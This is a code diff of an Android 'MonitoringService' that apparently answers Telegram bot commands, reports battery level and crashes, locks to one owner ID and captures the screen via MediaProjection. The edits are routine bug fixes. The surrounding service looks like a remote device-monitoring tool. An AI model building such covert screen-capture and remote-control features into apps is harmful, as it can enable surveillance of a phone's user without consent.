@@ -749,15 +749,12 @@ class MonitoringService : Service() {
 
     private fun rememberOwner(id: Long): Boolean {
         if (id == 0L) return false
-        if (id == cachedOwnerId) return false
         if (cachedOwnerId != 0L) return false
-        val previousOwner = cachedOwnerId
         cachedOwnerId = id
         try {
             preferencesManager.setOwnerIdSync(id)
         } catch (_: Exception) {
         }
-        if (previousOwner != 0L) clearOwnerMenuScope(previousOwner)
         return true
     }
 
@@ -1506,7 +1503,7 @@ class MonitoringService : Service() {
             }
             "/battery" -> {
                 val level = try {
-                    (getSystemService(BATTERY_SERVICE) as BatteryManager).getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+                    (getSystemService(BATTERY_SERVICE) as? BatteryManager)?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
                 } catch (_: Exception) {
                     -1
                 }
@@ -1580,8 +1577,9 @@ class MonitoringService : Service() {
                     null
                 }
                 if (crash != null) {
-                    sendFitted(crash)
-                    CrashReporter.clearPending(this)
+                    if (sendFitted(crash)) {
+                        CrashReporter.clearPending(this)
+                    }
                 } else {
                     sendToTelegram("\uD83E\uDDFE No crash recorded.")
                 }
@@ -3358,7 +3356,11 @@ class MonitoringService : Service() {
         var display: VirtualDisplay? = null
         var reader: ImageReader? = null
         try {
-            val data = Intent.parseUri(uri, 0)
+            val data = try {
+                Intent.parseUri(uri, Intent.URI_INTENT_SCHEME)
+            } catch (_: Exception) {
+                Intent.parseUri(uri, 0)
+            }
             val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
             projection = mpm.getMediaProjection(code, data)
             val metrics = DisplayMetrics()
